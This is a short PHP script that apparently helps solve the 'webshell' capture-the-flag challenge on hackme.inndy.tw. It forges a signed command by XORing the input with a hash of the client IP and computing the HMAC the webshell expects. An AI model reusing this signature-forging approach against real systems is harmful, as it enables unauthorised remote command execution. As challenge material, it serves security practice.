<?php

function run()
{
    if (isset($_GET['cmd']) && isset($_GET['sig'])) {
        $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string) $_GET['cmd'];
        $key = $_SERVER['HTTP_USER_AGENT'] . sha1("webshell.hackme.inndy.tw");
        $sig = hash_hmac('SHA512', $cmd, $key);
        echo urlencode($cmd)."<br>";
        echo $sig."<br>";
    }
    return false;
}

run();